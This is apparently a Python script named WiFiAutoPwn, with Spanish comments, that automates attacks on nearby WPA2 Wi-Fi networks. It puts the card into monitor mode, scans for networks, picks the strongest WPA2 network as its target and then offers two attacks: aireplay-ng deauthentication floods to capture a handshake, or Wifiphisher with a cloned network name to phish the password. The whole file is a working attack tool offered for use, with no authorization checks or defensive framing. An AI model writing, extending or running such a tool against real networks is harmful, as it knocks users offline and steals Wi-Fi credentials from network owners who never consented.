#!/usr/bin/env python3
import os
import re
import sys
import time
import subprocess
from dataclasses import dataclass
from typing import List, Optional

# Configuración de herramientas
AIRODUMP = "airodump-ng"
AIREPLAY = "aireplay-ng"
HCXDUMP = "hcxdumptool"
HASHCAT = "hashcat"
WIFIPHISHER = "wifiphisher"
WORDLISTS = "/usr/share/wordlists/"

@dataclass
class WiFiNetwork:
    bssid: str
    channel: str
    essid: str
    power: int
    encryption: str

@dataclass
class Handshake:
    bssid: str
    essid: str
    file: str

class WiFiAutoPwn:
    def __init__(self, interface: str):
        self.interface = interface
        self.monitor_interface = f"{interface}mon"
        self.target: Optional[WiFiNetwork] = None
        self.handshake: Optional[Handshake] = None
        self.wordlist = f"{WORDLISTS}rockyou.txt"

        self._kill_conflicting_processes()
        self._enable_monitor_mode()

    def _run_command(self, command: str, background: bool = False) -> Optional[str]:
        try:
            if background:
                subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return None
            result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            print(f"[!] Error en comando: {command}\n{e.stderr}")
            return None

    def _kill_conflicting_processes(self):
        self._run_command("sudo airmon-ng check kill")

    def _enable_monitor_mode(self):
        print(f"[*] Iniciando modo monitor en {self.interface}...")
        self._run_command(f"sudo airmon-ng start {self.interface}")

    def scan_networks(self, duration: int = 10) -> List[WiFiNetwork]:
        print("[*] Escaneando redes...")
        output_file = f"/tmp/scan_{int(time.time())}.csv"
        cmd = f"sudo {AIRODUMP} -w {output_file.replace('.csv', '')} --output-format csv {self.monitor_interface}"
        self._run_command(cmd, background=True)
        time.sleep(duration)
        self._run_command(f"sudo pkill -f {AIRODUMP}")

        networks = []
        try:
            with open(f"{output_file}-01.csv", "r") as f:
                for line in f.readlines()[3:]:
                    if "Station" in line:
                        break
                    parts = re.split(r'\s*,\s*', line.strip())
                    if len(parts) >= 14:
                        networks.append(WiFiNetwork(
                            bssid=parts[0].strip(),
                            channel=parts[3].strip(),
                            essid=parts[13].strip()[1:-1],
                            power=int(parts[8].strip()),
                            encryption=parts[5].strip()
                        ))
        except FileNotFoundError:
            print("[!] No se encontró el archivo de salida. Puede haber fallado la captura.")
        return networks

    def select_target(self, networks: List[WiFiNetwork]):
        target = max(
            [n for n in networks if 'WPA2' in n.encryption],
            key=lambda x: x.power
        )
        self.target = target
        print(f"[+] Objetivo seleccionado: {target.essid} ({target.bssid})")

    def capture_handshake(self, attack_time: int = 300):
        if not self.target:
            raise ValueError("No se ha seleccionado objetivo")
        print("[*] Iniciando captura de handshake...")
        output_file = f"/tmp/handshake_{self.target.essid}_{int(time.time())}"
        capture_cmd = f"sudo {AIRODUMP} -c {self.target.channel} --bssid {self.target.bssid} -w {output_file} {self.monitor_interface}"
        self._run_command(capture_cmd, background=True)
        deauth_cmd = f"sudo {AIREPLAY} -0 10 -a {self.target.bssid} {self.monitor_interface}"
        self._run_command(deauth_cmd, background=True)
        time.sleep(attack_time)
        if os.path.exists(f"{output_file}-01.cap"):
            self.handshake = Handshake(self.target.bssid, self.target.essid, f"{output_file}-01.cap")
            print("[+] Handshake capturado!")
        else:
            print("[!] No se capturó handshake")

    def wifiphisher_attack(self):
        if not self.target:
            raise ValueError("No se ha seleccionado objetivo")
        print("[*] Ejecutando ataque de phishing con Wifiphisher...")
        phisher_cmd = f"sudo {WIFIPHISHER} -aI {self.interface} -e '{self.target.essid}' --force-hostapd"
        self._run_command(phisher_cmd, background=True)

if __name__ == "__main__":
    # Si se pasa un argumento de línea de comandos, se utiliza; de lo contrario se solicita la interfaz
    if len(sys.argv) > 1:
        interface = sys.argv[1]
    else:
        interface = input("Interfaz WiFi (ej: wlan0): ").strip()
    tool = WiFiAutoPwn(interface)
    networks = tool.scan_networks()
    for i, net in enumerate(networks):
        print(f"{i+1}. {net.essid} ({net.bssid}) - {net.encryption}")
    tool.select_target(networks)
    option = input("1. Capturar Handshake\n2. Ataque de Phishing (Wifiphisher)\nSeleccione opción: ")
    if option == "1":
        tool.capture_handshake()
    elif option == "2":
        tool.wifiphisher_attack()
    else:
        print("[!] Opción inválida")
